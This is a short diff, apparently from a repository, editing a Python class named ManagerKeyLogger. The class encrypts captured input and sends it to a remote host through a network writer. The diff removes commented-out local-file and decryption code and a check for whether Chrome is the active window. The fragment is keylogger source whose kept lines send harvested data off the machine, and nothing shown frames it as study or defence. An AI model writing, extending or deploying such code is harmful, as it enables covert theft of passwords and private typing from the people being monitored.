@@ -30,11 +30,7 @@ class ManagerKeyLogger:
 
               self.send_to_network.write(text_encrypt,self.service.host_name)
 
-              # self.writeFile.write(text_encrypt)
-              # data_json = self.writeFile.load_data()
-              # decrypt = self.encryptor.decrypt(data_json)
-              # self.decrypt=decrypt
-              # self.get_data(decrypt)
+
               print(self.service.host_name)
               print("Original Data:", data)
               print("Encrypted Data:", text_encrypt)
@@ -44,9 +40,6 @@ class ManagerKeyLogger:
     def get_data(self):
         return self.decrypt
 
-    # def is_keyboard_in_chrome(self):
-    #     active_window = gw.getActiveWindow()
-    #
-    #     return active_window and "chrome" in active_window.title.lower()
+
 
 manager = ManagerKeyLogger()
